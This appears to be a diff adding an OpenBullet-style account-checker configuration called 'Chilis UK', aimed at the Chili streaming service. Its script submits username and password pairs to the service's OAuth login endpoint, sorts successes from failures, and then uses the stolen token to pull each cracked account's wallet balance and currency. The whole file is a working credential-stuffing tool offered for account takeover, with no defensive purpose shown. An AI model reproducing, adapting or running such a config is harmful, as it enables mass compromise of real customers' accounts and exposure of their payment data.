@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "Chilis UK",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-22T01:32:42.9336898-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://uk.chili.com/gatekeeper/api/v1/oauth2/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&x_device_id=980fcc80-455a-4f57-b7d8-8ad72b8d7988" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"Wrong E-mail and/or Password\"," 
+  KEYCHAIN Success OR 
+    KEY "\"access_token\" " 
+PARSE "<SOURCE>" LR "\"access_token\" : \"" "\"" Recursive=FALSE -> VAR "T" "" "" 
+REQUEST GET "https://uk.chili.com/bill/api/v2/wallet/me/paymentMethods" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "authorization: Bearer <T>" 
+PARSE "<SOURCE>" LR "balance\" : " "," Recursive=FALSE -> CAP "Balance" "" "" 
+PARSE "<SOURCE>" LR "\"currency\" : \"" "\"" Recursive=FALSE -> CAP "Currency" "" "" 
